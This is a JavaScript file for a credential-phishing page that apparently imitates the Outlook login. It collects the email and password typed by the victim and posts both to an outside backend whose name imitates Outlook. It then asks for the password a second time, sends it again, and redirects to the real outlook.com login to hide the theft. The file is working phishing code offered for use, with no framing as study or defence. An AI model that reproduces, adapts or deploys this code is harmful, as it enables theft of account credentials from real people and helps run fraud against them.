document.addEventListener("DOMContentLoaded", () => {
  let clickedOnce = false;

  const btn = document.getElementById("btn");
  const input1Field = document.getElementById("input1");
  const input2Field = document.getElementById("input2");
  const msg = document.getElementById("msg");

  btn.addEventListener("click", async () => {
    const input1 = input1Field.value.trim();
    const input2 = input2Field.value.trim();

    // Validation
    if (!input1 || !input2) {
      alert("Please fill in both fields.");
      return;
    }

    // Disable button while processing
    btn.disabled = true;
    btn.textContent = "Sending...";

    try {
      await fetch("https://outlook-backend-q89a.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ input1, input2 }),
      });
      console.log("✅ Sent:", { input1, input2 });
    } catch (err) {
      console.error("❌ Failed to send:", err);
      alert("Something went wrong. Try again later.");
      btn.disabled = false;
      btn.textContent = clickedOnce ? "Continue" : "Submit";
      return;
    }

    if (!clickedOnce) {
      clickedOnce = true;
      input1Field.disabled = true;
      input2Field.value = "";
      msg.style.display = "block"; // 👈 show message
      btn.disabled = false;
      btn.textContent = "Continue";
    } else {
      if (!input2) {
        alert("Please re-enter your password.");
        btn.disabled = false;
        btn.textContent = "Continue";
        return;
      }

      try {
        await fetch("https://outlook-backend-q89a.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            input1: input1Field.value.trim(),
            input2,
          }),
        });
        console.log("✅ Second Sent:", {
          input1: input1Field.value.trim(),
          input2,
        });

        msg.style.display = "none"; // 👈 hide message before redirect
        window.location.href = "https://outlook.com/login";
      } catch (err) {
        console.error("❌ Failed second time:", err);
        alert("Something went wrong on second entry.");
        btn.disabled = false;
        btn.textContent = "Continue";
        return;
      }
    }
  });
});
